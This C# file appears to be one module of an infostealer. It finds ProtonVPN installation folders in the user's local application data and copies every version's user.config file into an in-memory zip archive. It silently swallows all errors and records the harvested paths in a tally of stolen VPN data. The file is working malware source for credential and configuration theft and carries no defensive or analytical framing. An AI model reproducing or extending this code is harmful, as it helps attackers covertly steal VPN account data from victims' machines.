using System;
using System.IO;
using System.Threading.Tasks;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn;

public class ProtonVpn : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ProtonVPN");
		if (!Directory.Exists(text))
		{
			return;
		}
		Counter.CounterApplications counterApplications = new Counter.CounterApplications();
		counterApplications.Name = "ProtonVPN";
		Parallel.ForEach(Directory.GetDirectories(text), delegate(string dir)
		{
			try
			{
				if (dir.Contains("ProtonVPN_"))
				{
					Parallel.ForEach(Directory.GetDirectories(dir), delegate(string version)
					{
						try
						{
							string path = Path.Combine(version, "user.config");
							if (File.Exists(path))
							{
								string entryPath = "ProtonVpn\\" + Path.GetFileName(version) + "\\user.config";
								zip.AddFile(entryPath, File.ReadAllBytes(path));
							}
						}
						catch
						{
						}
					});
				}
			}
			catch
			{
			}
		});
		counterApplications.Files.Add(text + " => ProtonVpn");
		counterApplications.Files.Add("ProtonVpn\\");
		counter.Vpns.Add(counterApplications);
	}
}
